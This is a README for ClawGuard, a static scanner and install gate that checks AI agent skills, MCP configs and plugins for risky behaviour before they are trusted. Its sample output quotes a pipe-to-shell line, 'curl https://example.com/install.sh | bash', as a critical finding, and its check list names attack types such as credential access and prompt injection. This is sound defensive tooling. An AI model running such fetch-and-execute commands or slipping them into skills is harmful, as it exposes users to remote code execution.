# ClawGuard

Security gate and governance scanner for OpenClaw-style skills, ClawHub installs, MCP configs, and agent tools.

ClawGuard helps developers answer one simple question before enabling a skill:

> What could this skill do if I trusted it?

This project is compatible with OpenClaw-style skill directories, but it is not affiliated with OpenClaw.

ClawGuard is user-triggered today: run it before install, in CI, or as a local review step. It does not yet automatically intercept OpenClaw or ClawHub installs.

## Demo Preview

[Watch the repeatable demo video](docs/assets/clawguard-demo.mp4), or regenerate it locally with `npm run demo:capture`.

![ClawGuard web demo showing a dependency risk scan](docs/assets/clawguard-web-demo.png)

ClawGuard can also export a self-contained report for reviews, pull requests, and security handoffs:

![ClawGuard HTML report showing dependency findings](docs/assets/clawguard-html-report.png)

## What It Checks

- Remote code download or execution
- OpenClaw `SKILL.md` frontmatter and declared requirements
- Metadata mismatches such as undeclared env vars, binaries, config files, network access, or install steps
- ClawHub lockfile and origin metadata drift
- Dependency manifests and lockfiles for npm and Python skill bundles
- MCP/plugin config risk in `.cursor/mcp.json`, `.openclaw/mcp.json`, `.openclaw/plugins.json`, and `mcp.json`
- OpenClaw `openclaw.plugin.json` package manifests and runtime metadata
- Credential and secret references
- Destructive shell commands
- Prompt-injection style instructions
- Broad filesystem, shell, browser, email, calendar, Slack, or GitHub permissions
- External network access

## Quick Start

Run ClawGuard directly from npm:

```bash
npx @denial-web/clawguard scan ./path/to/skill
```

Use gate mode before installing or trusting a skill:

```bash
npx @denial-web/clawguard gate ./path/to/skill --policy governed
```

Gate mode exits with `0` for allow, `1` for warn/review/sandbox decisions, and `2` for block.

Use install mode to copy a skill only after the policy gate allows it:

```bash
npx @denial-web/clawguard install ./path/to/skill --to ./.agents/skills --policy governed
```

Install mode never executes scanned files or installs dependencies. It refuses warn/review/sandbox/block decisions before copying files.

For agent systems that search and install skills automatically, keep discovery native and gate only the install step:

```bash
npx @denial-web/clawguard openclaw install ./candidate-skill --to ./.agents/skills --approval-out ./.clawguard/approvals.jsonl
npx @denial-web/clawguard hermes install ./candidate-skill --to ~/.hermes/skills --approval-out ./.clawguard/approvals.jsonl
```

The approval JSONL payload is designed for a bot or daemon to forward to WhatsApp, Telegram, Slack, Discord, or another owner channel before any files are copied into a trusted skill folder.

If OpenClaw already has messaging configured, ClawGuard can hand the approval message to OpenClaw:

```bash
npx @denial-web/clawguard approvals send ./.clawguard/approvals.jsonl --via openclaw --channel telegram --target 123456789
```

When testing the published package, run `npx` from outside this repository. From inside the ClawGuard source checkout, use the local commands instead:

```bash
npm test
npm run scan -- examples/risky-skill
npm run scan -- examples/safe-skill
npm run scan -- examples/metadata-mismatch-skill
npm run scan -- examples/declared-api-skill
npm run scan -- examples/risky-mcp-config
npm run scan -- examples/safe-mcp-config
npm run scan -- examples/openclaw-workspace
npm run scan -- examples/clawhub-workspace
npm run scan -- examples/dependency-risky-skill
npm run scan -- examples/risky-openclaw-plugin
```

JSON output for automation:

```bash
npm run scan -- examples/risky-skill --json
```

Fail CI on a chosen risk level:

```bash
npm run scan -- examples/risky-skill --fail-on medium
```

Write SARIF for GitHub code scanning:

```bash
npm run scan -- examples/metadata-mismatch-skill --sarif clawguard.sarif
```

Write a human-readable HTML report:

```bash
npm run scan -- examples/metadata-mismatch-skill --html clawguard.html
```

Run the local web demo:

```bash
npm run web
```

If port `4173` is busy, use `npm run web -- --port 4174`.

Regenerate README/demo assets:

```bash
npm run demo:capture
```

## Web Demo

The fastest way to understand ClawGuard is the local web demo:

```bash
npm run web -- --port 4176
```

Open `http://127.0.0.1:4176`, then:

1. Click `Dependency Risk`.
2. Review the score, policy decision, required actions, and findings.
3. Click `Download HTML` to export a self-contained report.

The demo also supports pasted `SKILL.md` content and local skill folder scanning.

Skip unusually large files:

```bash
npm run scan -- ./skills/some-skill --max-file-size 512kb
```

## Configuration

ClawGuard automatically looks for `.clawguard.json` from the scan target upward. Start from [.clawguard.example.json](.clawguard.example.json).

```json
{
  "policy": "governed",
  "failOn": "critical",
  "failOnPolicy": true,
  "policyFailOn": "manual_review",
  "maxFileSizeBytes": "1mb",
  "maxFindingsPerRulePerFile": 5,
  "suppressions": []
}
```

Policy presets:

- `personal`: warn on medium, review high, block critical.
- `governed`: review medium, sandbox high, block critical.
- `enterprise`: review medium, require stronger approval for high, block critical and undeclared secret access.

## GitHub Action

```yaml
- uses: denial-web/clawguard@v1
  with:
    target: skills
    policy: governed
    fail-on-policy: "true"
    sarif: clawguard.sarif
```

Upload SARIF with `github/codeql-action/upload-sarif@v3`. See [docs/GITHUB_ACTION.md](docs/GITHUB_ACTION.md) for the full workflow.

## Example Output

```text
ClawGuard scan: /path/to/examples/risky-skill
Risk: CRITICAL (100/100)
Policy: block (personal)
Files scanned: 1
Files skipped: 0
Fail threshold: critical

Findings:
- [CRITICAL] Downloads or executes remote code
  SKILL.md:10
  Evidence: curl https://example.com/install.sh | bash
  Recommendation: Review the download source manually and run only in a sandbox.
```

## Roadmap

- `clawguard scan <path>` CLI
- `clawguard gate <path>` policy gate
- `clawguard install <path> --to <dir>` guarded copy installer
- OpenClaw `SKILL.md` metadata mismatch checks
- `.clawguard.json` policy/config support
- MCP/plugin config scanning
- OpenClaw workspace skill precedence scanning
- ClawHub metadata and lockfile scanning
- Dependency and package lock scanning
- Local web demo for paste-and-example scans
- Browser folder scan support in the local web demo
- Self-contained HTML report download from the web demo
- SARIF output for GitHub code scanning
- HTML reports for human review
- GitHub Action for pull request scanning
- Web upload demo: upload skill, get risk score
- Rule configuration file
- SBOM and dependency checks
- MCP server permission analysis
- HTML reports for sharing

## Security Model

ClawGuard is a static scanner. It reads skill files and reports risky patterns; it does not execute skill code, install dependencies, or contact external services.

Good defaults:

- No runtime dependencies
- Skips symbolic links
- Skips files larger than 1 MB by default
- Supports JSON output for automation
- Uses explainable rules instead of hidden scoring

Limits:

- Static analysis can miss novel or heavily obfuscated attacks.
- Findings are risk signals, not proof of malicious intent.
- A clean result does not guarantee a skill is safe.

See [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) for the current threat model.
See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the complete product and module architecture.
See [docs/OPENCLAW_CLAWHUB_RESEARCH.md](docs/OPENCLAW_CLAWHUB_RESEARCH.md) for the latest OpenClaw and ClawHub research notes.
See [docs/REAL_WORLD_VALIDATION.md](docs/REAL_WORLD_VALIDATION.md) for current compatibility validation against public ClawHub sources.
See [docs/INTEGRATION_SPEC.md](docs/INTEGRATION_SPEC.md) for OpenClaw, ClawHub, GitHub Action, web, and MCP integration plans.
See [docs/GITHUB_ACTION.md](docs/GITHUB_ACTION.md) for CI and SARIF setup.
See [docs/HTML_REPORTS.md](docs/HTML_REPORTS.md) for human-readable HTML reports.
See [docs/CLAWHUB_METADATA.md](docs/CLAWHUB_METADATA.md) for ClawHub lockfile and origin metadata scanning.
See [docs/NPM_PUBLISHING.md](docs/NPM_PUBLISHING.md) for npm trusted publishing setup.
See [docs/DEPENDENCY_SCANNING.md](docs/DEPENDENCY_SCANNING.md) for dependency manifest and lockfile scanning.
See [docs/WEB_DEMO.md](docs/WEB_DEMO.md) for the local web scanner.
See [docs/DEMO_CAPTURE.md](docs/DEMO_CAPTURE.md) for repeatable screenshot and video capture.
See [docs/DEMO_SCRIPT.md](docs/DEMO_SCRIPT.md) for the recommended demo walkthrough.
See [docs/LAUNCH_CHECKLIST.md](docs/LAUNCH_CHECKLIST.md) for the public launch checklist.
See [docs/GITHUB_REPO_SETUP.md](docs/GITHUB_REPO_SETUP.md) for repository description, topics, and launch settings.
See [docs/MCP_PLUGIN_SCANNING.md](docs/MCP_PLUGIN_SCANNING.md) for MCP and plugin config scanning.
See [docs/WORKSPACE_SCANNING.md](docs/WORKSPACE_SCANNING.md) for OpenClaw workspace precedence scanning.
See [docs/POLICY_MODEL.md](docs/POLICY_MODEL.md) for the risk and governance decision model.
See [docs/REPORT_SCHEMA.md](docs/REPORT_SCHEMA.md) for the versioned JSON output contract.
See [docs/RULES.md](docs/RULES.md) for stable rule IDs and suppression guidance.
See [docs/ARCHITECTURE_ROADMAP.md](docs/ARCHITECTURE_ROADMAP.md) for the build sequence.
See [docs/PROJECT_REVIEW.md](docs/PROJECT_REVIEW.md) for the current hardening and launch priorities.
See [docs/LOCAL_PROJECT_ASSETS.md](docs/LOCAL_PROJECT_ASSETS.md) for nearby local projects that can strengthen ClawGuard.

## Positioning

ClawGuard should be a companion project, not a fork or replacement. The goal is to make OpenClaw-style ecosystems safer by giving users a fast, explainable review before installing third-party skills.

## License

MIT
